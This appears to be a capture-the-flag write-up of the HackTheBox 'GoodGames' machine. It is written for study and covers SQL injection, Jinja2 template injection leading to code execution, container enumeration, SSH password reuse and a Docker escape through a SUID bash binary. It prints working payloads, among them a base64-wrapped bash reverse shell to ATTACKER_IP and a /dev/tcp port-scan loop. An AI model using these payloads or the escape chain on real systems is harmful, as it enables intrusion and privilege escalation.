# HTB GoodGames — Full Writeup

## Box Info

| Field | Value |
|---|---|
| Platform | HackTheBox |
| OS | Linux |
| Difficulty | Easy |
| Stack | Flask / Jinja2 / MySQL / Docker |

## Attack Flow

SQLi on login → Dump admin hash → Crack hash → Access admin dashboard on vhost → SSTI on Flask/Jinja2 full name field → Reverse shell into Docker container → Internal network scan → SSH to host with password reuse → Docker escape via mounted home directory + SUID bash

## Phase 1: SQL Injection on Login

The login endpoint is vulnerable to SQLi on the email parameter. Used sqlmap to confirm and enumerate:

- Backend: MySQL 8
- Current user: `main_admin@localhost` with only USAGE privilege (no FILE, so no file read/write)
- Dumped the database and found an admin password hash

Cracked the hash and logged into the main application as admin.

## Phase 2: VHost Discovery and SSTI

After logging in as admin, discovered a virtual host running an admin dashboard — a separate Flask application.

### How to Detect SSTI

The full name field in the profile settings was the injection point. Here's the thing about SSTI detection: HTML and JavaScript injection are **client-side** — they test if the app reflects your input in the browser without sanitizing it (XSS). SSTI is **server-side** — you're testing if the template engine evaluates your input before rendering.

The test for SSTI is math expressions in template syntax, not HTML tags:

1. `{{7*7}}` — if the page shows `49` instead of `{{7*7}}`, the Jinja2 template engine evaluated it server-side
2. `${7*7}` — tests for other template engines (Freemarker, Thymeleaf)
3. `<%= 7*7 %>` — tests ERB (Ruby)
4. `#{7*7}` — tests Pug/Jade

HTML like `<b>test</b>` or JavaScript like `<script>alert(1)</script>` not rendering doesn't mean the field is safe — it just means there's no XSS. SSTI lives in a completely different layer. Always test template expressions separately.

### SSTI Detection Methodology

1. Identify the tech stack (Flask = Jinja2, Django = Django Templates, Express = EJS/Pug, PHP = Twig/Smarty)
2. Inject `{{7*7}}` in every user-controlled field that gets reflected back
3. If `49` appears in the response, you have SSTI
4. If `{{7*7}}` appears as-is, try other template syntaxes
5. If nothing works, it's not SSTI

### SSTI to RCE (Jinja2)

Once confirmed, escalate from math to code execution:

```
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

This traverses Python's object hierarchy from the config object to reach the `os` module and run commands. For a reverse shell, base64 encode the payload to avoid special character issues:

```bash
echo -n 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' | base64
```

Then inject:

```
{{config.__class__.__init__.__globals__['os'].popen('echo${IFS}BASE64_PAYLOAD${IFS}|base64${IFS}-d|bash').read()}}
```

Note: `${IFS}` replaces spaces because the input field might strip or break on spaces.

## Phase 3: Docker Container Enumeration

The reverse shell lands inside a Docker container as root. Indicators:

- `.dockerenv` file in `/`
- Minimal tooling (no nmap, limited commands)
- Different hostname than expected

### Key Findings

1. `/home/augustus` is mounted from the host with read/write permissions (found via `mount` command)
2. The UID 1000 shows as a number instead of a username in `ls -la`, hinting this directory belongs to a host user not present in the container's `/etc/passwd`
3. Container IP is `172.19.0.2`, meaning host is likely `172.19.0.1`

### Internal Port Scan (No Nmap)

```bash
for PORT in {0..1000}; do timeout 1 bash -c "</dev/tcp/172.19.0.1/$PORT" 2>/dev/null && echo "port $PORT is open"; done
```

Found SSH (port 22) open on the host.

## Phase 4: Lateral Movement via Password Reuse

Tried the cracked admin password on SSH to the host:

```bash
ssh augustus@172.19.0.1
```

Password reuse worked — logged in as augustus on the host machine.

## Phase 5: Docker Escape via Mounted Directory + SUID

This is the clever part. We have two sessions:
- Docker container: root
- Host machine: augustus (unprivileged)

Both can access `/home/augustus` because it's mounted.

### Steps

1. As augustus on the host, copy bash to the home directory:
```bash
cp /bin/bash .
exit
```

2. As root in the Docker container, change ownership and set SUID:
```bash
chown root:root /home/augustus/bash
chmod 4755 /home/augustus/bash
```

The `4` in `4755` sets the SUID bit — anyone who runs this binary executes it as root (the file owner).

3. SSH back in as augustus and run the SUID bash:
```bash
ssh augustus@172.19.0.1
./bash -p
```

The `-p` flag is critical — without it, bash drops the elevated privileges as a safety measure. With `-p`, it keeps the effective UID of root.

Result: root shell on the host.

## Methodology Notes

### SSTI Detection Checklist

- Identify template engine from tech stack (Flask=Jinja2, etc.)
- Test `{{7*7}}` in every reflected input field
- HTML/JS not rendering does NOT rule out SSTI — they're different vulnerability classes
- SSTI is server-side template evaluation, XSS is client-side rendering
- After confirming, escalate: math → config access → os.popen → RCE

### Docker Escape Checklist

1. Run `mount` to find host-mounted directories
2. Check if mounted `rw` (read/write) or `ro` (read-only)
3. Check who you are in the container (`id` — are you root?)
4. Scan internal network for the host (`172.19.0.1` usually)
5. Try SSH/password reuse to get a host shell
6. If you're root in container + unprivileged on host + shared rw mount = SUID escape

### Password Reuse

Always try known credentials on:
- SSH (internal and external)
- Other web apps / vhosts
- Database connections
- Any new service discovered during enumeration

### Key Lessons

1. SSTI and XSS are different layers — test both independently
2. `${IFS}` bypasses space filtering in injection payloads
3. Docker container root + mounted host directory = privilege boundary crossing
4. SUID + `-p` flag on bash = instant root
5. Internal Docker networks often expose services (SSH, databases) not reachable externally
6. UID showing as a number instead of a username hints at a mounted directory from another system
